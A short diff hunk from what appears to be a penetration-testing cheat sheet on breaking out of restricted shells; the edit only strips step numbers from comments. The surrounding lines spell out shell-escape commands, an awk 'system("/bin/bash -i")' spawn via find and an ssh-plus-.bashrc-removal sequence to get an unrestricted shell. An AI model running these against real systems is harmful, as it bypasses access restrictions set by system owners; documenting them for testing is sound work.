@@ -42,17 +42,17 @@ find / -name udev -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
 # Check the 'env' variable!
 # Linux will default to bin/bash default bashrc if htere is no present .bashrc file in a User's home directory. Legit shell.
 
-# 1
+# 
 ssh user@127.0.0.1 "/bin/sh"
-# 2
+# 
 cd $HOME
-# 3
+# 
 mv .bashrc .bashrc.BAK
-# 4
+# 
 exit
-# 5
+# 
 ssh user@127.0.0.1
-# $$$$
+# 
 # user@Target:~$
 ```
 
